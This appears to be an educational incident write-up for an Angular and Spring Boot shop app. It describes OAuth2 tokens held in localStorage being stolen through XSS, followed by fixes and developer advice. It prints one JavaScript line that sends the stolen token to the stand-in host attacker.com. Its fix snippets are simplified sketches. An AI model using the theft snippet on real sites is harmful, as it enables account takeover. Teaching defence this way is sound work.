# Buy_From_Me

Welcome to **Buy_From_Me**, an e-commerce platform where users can browse products, add items to their cart, and make purchases seamlessly. The frontend is built with **Angular**, while the backend leverages the power of **Spring Boot**. One of the app’s standout features is its **social login integration**, which allows users to log in using their **Google, Facebook, or GitHub** accounts. This feature was designed to provide a **seamless and secure authentication** experience for users.

## The Security Incident: Unauthorized Access and Profile Changes

### Stage 1: Strange Account Behavior
Users started reporting unusual behavior:

- Some users claimed their **profile information had been changed** without their action.
- Others reported that **orders were placed** using their saved payment details, even though they hadn’t made any purchases.

At first, the team thought these were isolated incidents. However, as more users reported similar issues, it became clear that something was seriously wrong.

### Stage 2: The Investigation Begins
The **Site Reliability Engineering (SRE)** team reviewed the logs and found that the app’s **OAuth2 tokens had been compromised**. A developer manually tested the OAuth2 authentication flow and discovered that the app was **storing OAuth2 tokens in localStorage**, making them vulnerable to theft via **XSS attacks**.

## The Vulnerability: OAuth2 Token Hijacking

The issue arose because of:

1. **Improper Token Storage**: The app was storing OAuth2 tokens in **localStorage**, which is accessible to any JavaScript code running on the same domain, making it vulnerable to **XSS attacks**.
2. **No Token Encryption**: The tokens were not encrypted, making it easy for attackers to steal and use them.
3. **Lack of Monitoring**: The team had not set up proper monitoring to detect unusual activity or token theft.

## The Exploit: How It Happened
An attacker injected a **malicious script** into the app via an **XSS vulnerability**:

```javascript
const token = localStorage.getItem('oauth2_token');
fetch('https://attacker.com/steal?token=' + token);
```

### Impact of the Attack
This led to:

- **Unauthorized Access**: Attackers could **impersonate users** and perform actions on their behalf.
- **Data Theft**: Sensitive user information, including **payment details**, could be exposed.
- **Erosion of User Trust**: Users lost confidence in the app, and some stopped using it altogether.

## The Solution: Secure Token Storage and Encryption

To prevent this vulnerability, the team took the following **security measures**:

### 1. Secure Token Storage
The app was updated to store **OAuth2 tokens in HttpOnly cookies** instead of **localStorage**. This ensured that the tokens were **not accessible to JavaScript**, making them immune to **XSS attacks**.

#### Example (Spring Boot Cookie Configuration):
```java
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    serializer.setCookieName("OAUTH2_TOKEN");
    serializer.setUseHttpOnlyCookie(true);
    serializer.setUseSecureCookie(true);
    return serializer;
}
```

### 2. Implement Token Encryption
The app was updated to **encrypt OAuth2 tokens** before storing them, making it harder for attackers to steal and use them.

#### Example (Token Encryption):
```java
public String encryptToken(String token) {
    // Use a secure encryption algorithm (e.g., AES)
    return EncryptionUtils.encrypt(token, encryptionKey);
}
```

### 3. Set Up Logging and Monitoring
The team implemented the **ELK Stack (Elasticsearch, Logstash, Kibana)** for **centralized logging**. Alerts were configured to notify the team of any **unusual activity** or **token theft**.

#### Example (Logging Configuration in YAML):
```yaml
logging:
  level:
    org.springframework: ERROR
    com.buyfromme: DEBUG
```

### 4. Conduct a Security Audit
The team performed a **thorough security audit** to identify and fix other potential vulnerabilities. They used tools like **OWASP ZAP** and **Snyk** to scan the app for security issues.

### 5. Deploy the Fixed Version
The updated app was deployed to **production**, and users were notified of the improvements. The team also issued a **public statement** apologizing for the issue and explaining the steps taken to resolve it.

## Insights for Developers
To avoid similar issues, developers should:

✅ **Always Use Secure Token Storage**: Store OAuth2 tokens in **HttpOnly cookies** to prevent XSS attacks.

✅ **Encrypt Tokens**: Encrypt OAuth2 tokens before storing them to make them harder to steal.

✅ **Set Up Logging and Monitoring**: Monitor your app for unusual activity and respond quickly to incidents.

✅ **Conduct Regular Security Audits**: Regularly audit your app for vulnerabilities and fix them promptly.

✅ **Follow Security Best Practices**: Stay informed about security best practices and apply them consistently.

## A Word of Caution
For hackers or anyone considering exploiting such vulnerabilities:

⚠️ **Hacking is illegal and unethical**. If caught, you are subject to severe penalties and will be held accountable for your actions.

⚠️ **Every action leaves traces**; you may be tracked and prosecuted.

👉 Instead, **use this knowledge to secure your applications and educate others**.

## Conclusion
The **OAuth2 Token Hijacking** vulnerability in the **Buy_From_Me** app serves as a critical reminder: **security lies in the details**. Always assume an attacker is looking for weak spots and design your systems to withstand even the most creative attacks.

By following **secure practices** and **educating developers**, we can build **resilient, trustworthy applications**.

---

💡 **Keep learning, stay curious, and stay secure!**

**Happy Coding, and Secure Your Apps!** 🚀

